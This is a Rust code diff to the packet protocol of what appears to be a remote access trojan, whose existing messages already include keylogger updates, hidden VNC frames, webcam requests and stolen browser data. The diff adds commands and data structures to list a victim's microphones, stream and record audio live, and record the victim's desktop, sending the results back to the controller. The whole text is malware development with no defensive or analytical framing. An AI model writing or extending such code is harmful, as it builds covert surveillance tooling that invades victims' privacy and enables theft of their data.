@@ -34,6 +34,11 @@ pub enum ServerboundPacket {
     // Keylogger
     KeyloggerUpdate(KeyloggerUpdate),
     KeyloggerOfflineLogs(Vec<String>),
+    MicDeviceList(Vec<MicDeviceInfo>),
+    MicAudioChunk(MicAudioChunk),
+    MicRecordingFile(FileData),
+    DesktopRecordingPreviewFrame(DesktopRecordingPreviewFrame),
+    DesktopRecordingFile(FileData),
     BrowserData(BrowserData),
 }
 
@@ -67,6 +72,11 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
             ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
             ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
+            ServerboundPacket::MicDeviceList(_) => "Mic Device List",
+            ServerboundPacket::MicAudioChunk(_) => "Mic Audio Chunk",
+            ServerboundPacket::MicRecordingFile(_) => "Mic Recording File",
+            ServerboundPacket::DesktopRecordingPreviewFrame(_) => "Desktop Recording Preview Frame",
+            ServerboundPacket::DesktopRecordingFile(_) => "Desktop Recording File",
             ServerboundPacket::BrowserData(_) => "Browser Data",
         }
     }
@@ -85,6 +95,13 @@ pub enum ClientboundPacket {
     Disconnect,
     StartRemoteDesktop(RemoteDesktopConfig),
     StopRemoteDesktop,
+    RequestMicDevices,
+    StartMicLive(String),
+    StopMicLive,
+    StartMicRecording(String),
+    StopMicRecording,
+    StartDesktopRecording(RemoteDesktopConfig),
+    StopDesktopRecording,
     MouseClick(MouseClickData),
     KeyboardInput(KeyboardInputData),
     VisitWebsite(VisitWebsiteData),
@@ -155,8 +172,15 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::RequestWebcam => "Request Webcam",
             ClientboundPacket::Reconnect => "Reconnect",
             ClientboundPacket::Disconnect => "Disconnect",
-            ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
+                    ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
             ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
+            ClientboundPacket::RequestMicDevices => "Request Mic Devices",
+            ClientboundPacket::StartMicLive(_) => "Start Mic Live",
+            ClientboundPacket::StopMicLive => "Stop Mic Live",
+            ClientboundPacket::StartMicRecording(_) => "Start Mic Recording",
+            ClientboundPacket::StopMicRecording => "Stop Mic Recording",
+            ClientboundPacket::StartDesktopRecording(_) => "Start Desktop Recording",
+            ClientboundPacket::StopDesktopRecording => "Stop Desktop Recording",
             ClientboundPacket::MouseClick(_) => "Mouse Click",
             ClientboundPacket::KeyboardInput(_) => "Keyboard Input",
             ClientboundPacket::VisitWebsite(_) => "Visit Website",
@@ -205,6 +229,29 @@ pub struct RemoteDesktopConfig {
     pub display: i32,
     pub quality: u8,   // JPEG compression quality (1-100)
     pub fps: u8,       // Target frames per second
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct MicAudioChunk {
+    pub timestamp: u64,
+    pub sample_rate: u32,
+    pub channels: u16,
+    pub data: Vec<u8>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct MicDeviceInfo {
+    pub id: String,
+    pub name: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct DesktopRecordingPreviewFrame {
+    pub timestamp: u64,
+    pub display: i32,
+    pub width: usize,
+    pub height: usize,
+    pub data: Vec<u8>,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
